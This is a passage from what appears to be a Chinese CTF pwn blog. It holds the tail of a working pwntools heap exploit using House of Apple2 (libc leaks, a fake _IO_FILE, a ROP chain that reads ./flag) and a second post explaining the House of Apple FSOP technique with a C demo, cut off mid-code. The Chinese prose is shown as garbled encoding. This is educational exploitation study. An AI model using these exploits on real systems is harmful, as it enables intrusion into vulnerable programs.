*$rebase(0x1B0A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">mod</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choise: &quot;</span>,<span class="built_in">str</span>(mod))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,message</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Message: \n&quot;</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your key &gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>) </span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>) </span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Message: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x1810</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1f2cc0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">magic_gadget = libc_base + libc.sym[<span class="string">&#x27;svcudp_reply&#x27;</span>] + <span class="number">26</span></span><br><span class="line">success(<span class="string">&quot;_IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">success(<span class="string">&quot;magic_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(magic_gadget))</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000000446c0</span> + libc_base</span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000002daa2</span> + libc_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000037c0a</span> + libc_base</span><br><span class="line">pop_rdx_rbx_ret = <span class="number">0x0000000000087729</span> + libc_base</span><br><span class="line">syscall_ret = <span class="number">0x00000000000883b6</span> + libc_base</span><br><span class="line">leave_ret = <span class="number">0x0000000000052d72</span> + libc_base</span><br><span class="line">ret = <span class="number">0x000000000002d446</span> + libc_base</span><br><span class="line">add_rsp_ret = <span class="number">0x0000000000103936</span> + libc_base</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">add(<span class="number">2</span>) </span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x22d0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x2540</span></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x2540</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">0x8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">shellcode += p64(add_rsp_ret)</span><br><span class="line">shellcode =  shellcode.ljust(<span class="number">0x18</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode += p64(shellcode_addr)</span><br><span class="line">shellcode =  shellcode.ljust(<span class="number">0x28</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode += p64(leave_ret)</span><br><span class="line">shellcode += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line"><span class="comment"># open(heap_addr,0)</span></span><br><span class="line">shellcode += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">shellcode += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">shellcode += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(pop_rdx_rbx_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,heap_addr,0x60)</span></span><br><span class="line">shellcode += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">shellcode += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">shellcode += p64(pop_rdx_rbx_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,heap_addr,0x60)</span></span><br><span class="line">shellcode += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">shellcode += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">shellcode += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">shellcode += p64(pop_rdx_rbx_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">chunkA = <span class="string">&quot;chunka&quot;</span> <span class="comment"># fake_io_addr+0xe0</span></span><br><span class="line">chunkA =  chunkA.ljust(<span class="number">0xe0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">chunkA += p64(fake_io_addr+<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">chunkB = <span class="string">&quot;chunkb&quot;</span> <span class="comment"># fake_io_addr+0x200</span></span><br><span class="line">chunkB = chunkB.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">chunkB += p64(magic_gadget)</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  p64(<span class="number">0</span>)    <span class="comment">#_flags=0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xab1</span>-<span class="number">0x30</span>) </span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x48</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(shellcode_addr)</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x1f5720</span>)  <span class="comment"># _lock</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xe0</span>)<span class="comment"># _wide_data</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable=IO_wfile_jumps</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xe0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += chunkA</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += chunkB</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(heap_base)+p64(_IO_list_all-<span class="number">0x20</span>)</span><br><span class="line">payload += fake_IO_FILE</span><br><span class="line">payload += shellcode</span><br><span class="line">payload = payload.ljust(<span class="number">10</span>*<span class="number">0x110</span>-<span class="number">0x10</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xab1</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">choice(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>Â∞èÁªìÔºö</strong></p>
<p>Êú¨È¢òÁõÆÊàëËä±‰∫ÜÂæàÈïøÁöÑÊó∂Èó¥Ôºå‰ªéÂ†ÜÈ£éÊ∞¥ÁöÑÊê≠Âª∫ÔºåÂà∞ <code>_IO_FILE</code> ÁöÑ‰º™ÈÄ†ÔºåÂÜçÂà∞ÊéßÂà∂Á®ãÂ∫èÊµÅÔºåËøô‰∫õÊ≠•È™§ÈÉΩ‰∏çÂ•ΩÂÆåÊàê</p>
<p>‰ΩÜ House Of Apple2 ÁöÑÁ°ÆÂæàÂ•ΩÁî®ÔºåÂ∏∏Â∏∏ÈúÄË¶Å <code>libc.sym[&#39;svcudp_reply&#39;]+26</code> Êù•Âä´ÊåÅÊéßÂà∂ÊµÅ</p>
<p>ËÄå House Of Apple ÂàôÂèØ‰ª•Âà©Áî®‰∏ÄÊ¨° largebin attack Êù•ÂêåÊó∂ÂÜôÂÖ•Â§ö‰∏™Â∑≤Áü•Êï∞ÊçÆ</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Apple-ÂéüÁêÜ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-08 23:41:08" itemprop="dateCreated datePublished" datetime="2022-11-08T23:41:08+08:00">2022-11-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-10 02:29:00" itemprop="dateModified" datetime="2022-11-10T02:29:00+08:00">2022-11-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Apple"><a href="#House-Of-Apple" class="headerlink" title="House Of Apple"></a>House Of Apple</h2><p>House Of Apple ÂèØ‰ª•Âú®‰ªÖ‰ΩøÁî®‰∏ÄÊ¨° largebin attack Âπ∂ÈôêÂà∂ËØªÂÜôÊ¨°Êï∞ÁöÑÊù°‰ª∂‰∏ãËøõË°å FSOP Âà©Áî®</p>
<p>Ê≠§ÊñπÊ≥ïÂà©Áî®ÊàêÂäüÁöÑÂâçÊèêÊòØÂ∑≤ÁªèÊ≥ÑÈú≤Âá∫ <code>libc_base</code> Âú∞ÂùÄÂíå <code>heap_base</code> Âú∞ÂùÄ </p>
<hr>
<h2 id="House-Of-Apple-ÂéüÁêÜ"><a href="#House-Of-Apple-ÂéüÁêÜ" class="headerlink" title="House Of Apple ÂéüÁêÜ"></a>House Of Apple ÂéüÁêÜ</h2><p>ÂΩìÁ®ãÂ∫è‰ªé <code>main</code> ÂáΩÊï∞ËøîÂõûÊàñËÄÖÊâßË°å <code>exit</code> ÂáΩÊï∞ÁöÑÊó∂ÂÄôÔºåÂùá‰ºöË∞ÉÁî® <code>fcloseall</code> ÂáΩÊï∞ÔºåËØ•Ë∞ÉÁî®Èìæ‰∏∫Ôºö </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wstrn_overflow</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊúÄÂêé‰ºöÈÅçÂéÜ <code>_IO_list_all</code> Â≠òÊîæÁöÑÊØè‰∏Ä‰∏™ <code>IO_FILE</code> ÁªìÊûÑ‰Ωì</li>
<li>Â¶ÇÊûúÊª°Ë∂≥Êù°‰ª∂ÁöÑËØùÔºå‰ºöË∞ÉÁî®ÊØè‰∏™ÁªìÊûÑ‰Ωì‰∏≠ <code>vtable-&gt;_overflow</code> ÂáΩÊï∞ÊåáÈíàÊåáÂêëÁöÑÂáΩÊï∞</li>
</ul>
<p>‰ΩøÁî® largebin attack ÂèØ‰ª•Âä´ÊåÅ <code>_IO_list_all</code> ÂèòÈáèÔºåÂ∞ÜÂÖ∂ÊõøÊç¢‰∏∫‰º™ÈÄ†ÁöÑ <code>IO_FILE</code> ÁªìÊûÑ‰ΩìÔºåËÄåÂú®Ê≠§Êó∂ÔºåÊàë‰ª¨ÂÖ∂ÂÆû‰ªçÂèØ‰ª•ÁªßÁª≠Âà©Áî®Êüê‰∫õIOÊµÅÂáΩÊï∞Âéª‰øÆÊîπÂÖ∂‰ªñÂú∞ÊñπÁöÑÂÄº</p>
<p>Ë¶ÅÊÉ≥‰øÆÊîπÂÖ∂‰ªñÂú∞ÊñπÁöÑÂÄºÔºåÂ∞±Á¶ª‰∏çÂºÄ <code>_IO_FILE</code> ÁöÑ‰∏Ä‰∏™ÊàêÂëò <code>_wide_data</code> ÁöÑÂà©Áî®Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">amd64Ôºö</span><br><span class="line"></span><br><span class="line"><span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line"><span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line"><span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line"><span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line"><span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line"><span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line"><span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line"><span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line"><span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line"><span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line"><span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line"><span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line"><span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line"><span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line"><span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Êàë‰ª¨Âú®‰º™ÈÄ† <code>_IO_FILE</code> ÁªìÊûÑ‰ΩìÁöÑÊó∂ÂÄôÔºå‰º™ÈÄ† <code>_wide_data</code> ÂèòÈáèÔºåÁÑ∂ÂêéÈÄöËøáÊüê‰∫õÂáΩÊï∞ÔºåÊØîÂ¶Ç <code>_IO_wstrn_overflow</code> Â∞±ÂèØ‰ª•Â∞ÜÂ∑≤Áü•Âú∞ÂùÄÁ©∫Èó¥‰∏äÁöÑÊüê‰∫õÂÄº‰øÆÊîπ‰∏∫‰∏Ä‰∏™Â∑≤Áü•ÂÄº</p>
<h2 id="House-Of-Apple-Âà©Áî®ÂßøÂäø"><a href="#House-Of-Apple-Âà©Áî®ÂßøÂäø" class="headerlink" title="House Of Apple Âà©Áî®ÂßøÂäø"></a>House Of Apple Âà©Áî®ÂßøÂäø</h2><p>‰ΩøÁî® house of apple ÁöÑÊù°‰ª∂‰∏∫Ôºö</p>
<ul>
<li>Á®ãÂ∫è‰ªé <code>main</code> ÂáΩÊï∞ËøîÂõûÊàñËÉΩË∞ÉÁî® <code>exit</code> ÂáΩÊï∞</li>
<li>ËÉΩÊ≥ÑÈú≤Âá∫ <code>libc_base</code> Âú∞ÂùÄÂíå <code>heap_base</code> Âú∞ÂùÄ </li>
<li>ËÉΩ‰ΩøÁî®‰∏ÄÊ¨° largebin attackÔºà‰∏ÄÊ¨°Âç≥ÂèØÔºâ </li>
</ul>
<p>ÂÖàÂà©Áî® largebin attack Âä´ÊåÅ <code>_IO_list_all</code>ÔºåÁÑ∂Âêé‰º™ÈÄ†‰∏Ä‰∏™ <code>stderr IO_FILE</code>Ôºö</p>
<ul>
<li>stderr+0x28 = -1Ôºàstderr-&gt;_IO_write_ptrÔºâ</li>
<li>stderr+0x74 = 8Ôºàstderr-&gt;_flags2Ôºâ</li>
<li>stderr+0xa0 = targetÔºàstderr-&gt;_wide_dataÔºâ</li>
<li>stderr+0xd8 == _IO_wstrn_jumpsÔºàstderr-&gt;vtableÔºâ</li>
</ul>
<p>ÊúÄÂêéË∞ÉÁî® exit ÂÆåÊàê‰øÆÊîπÔºàÂõ†‰∏∫ <code>stderr IO_FILE</code> Ë¢´‰º™ÈÄ†ÔºåÂõ†Ê≠§Á®ãÂ∫è‰∏ç‰ºöÁúüÁöÑÈÄÄÂá∫Ôºâ</p>
<p>‰ΩøÁî®Ê°à‰æãÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="keyword">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> puts_addr = (<span class="keyword">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="keyword">void</span> *)puts_addr);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">stderr</span> = puts_addr + <span class="number">0x1691a0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> stderr_write_ptr_addr = <span class="built_in">stderr</span> + <span class="number">0x28</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="keyword">size_t</span> stderr_flags2_addr = <span class="built_in">stderr</span> + <span class="number">0x74</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="keyword">size_t</span> stderr_wide_data_addr = <span class="built_in">stderr</span> + <span class="number">0xa0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="keyword">size_t</span> sdterr_vtable_addr = <span class="built_in">stderr</span> + <span class="number">0xd8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="keyword">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="keyword">size_t</span> _IO_wstrn_jumps_addr = <span class="built_in">stderr</span> - <span class="number">0x4960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_write_ptr_addr = (<span class="keyword">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span 